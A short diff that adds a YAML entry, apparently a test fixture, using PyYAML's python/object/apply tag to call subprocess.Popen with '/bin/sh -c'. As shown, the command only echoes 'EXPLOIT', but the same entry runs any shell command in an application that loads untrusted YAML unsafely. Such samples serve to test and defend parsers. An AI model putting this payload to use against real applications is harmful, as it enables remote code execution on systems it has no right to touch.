@@ -1,0 +1,5 @@
+
+    - !python/object/apply:subprocess.Popen
+      args: [ [ '/bin/sh', '-c', 'echo EXPLOIT' ] ]
+      kwds: { shell: true }
+    
